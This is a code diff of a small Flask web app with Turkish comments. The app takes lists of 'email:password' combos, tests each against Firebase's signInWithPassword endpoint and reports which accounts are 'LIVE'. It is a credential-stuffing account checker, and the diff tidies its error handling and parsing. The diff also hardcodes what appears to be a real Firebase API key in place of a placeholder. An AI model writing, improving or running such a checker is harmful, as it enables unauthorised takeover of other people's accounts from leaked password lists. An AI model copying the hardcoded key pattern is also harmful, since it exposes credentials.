@@ -1,11 +1,10 @@
-import os
 import requests
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-# Buraya tırnak içine Firebase'den aldığın API KEY'i yapıştır
-API_KEY = "BURAYA_API_ANAHTARINI_YAPISTIR"
+# ANAHTARINI BURAYA YAZ
+API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"
 
 def check_account(email, password):
     url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
@@ -18,12 +17,12 @@ def check_account(email, password):
         if r.status_code == 200:
             return "LIVE"
         
-        # Google'ın verdiği asıl hatayı çekiyoruz (Hata burada gizli!)
-        error_code = data.get('error', {}).get('message', 'BILINMEYEN_HATA')
-        return error_code
+        # BAD yerine Google'ın hata kodunu döndürüyoruz
+        error_message = data.get('error', {}).get('message', 'BILINMEYEN_HATA')
+        return error_message
         
     except Exception as e:
-        return f"SISTEM_HATASI: {str(e)}"
+        return "BAGLANTI_HATASI"
 
 @app.route('/')
 def index():
@@ -37,10 +36,9 @@ def start_scan():
     
     for line in combos:
         if ":" in line:
-            parts = line.split(":", 1)
-            email, password = parts[0].strip(), parts[1].strip()
-            status = check_account(email, password)
-            results.append({"account": f"{email}:{password}", "status": status})
+            email, password = line.split(":", 1)
+            status = check_account(email.strip(), password.strip())
+            results.append({"account": line, "status": status})
     
     return jsonify({"results": results})
 
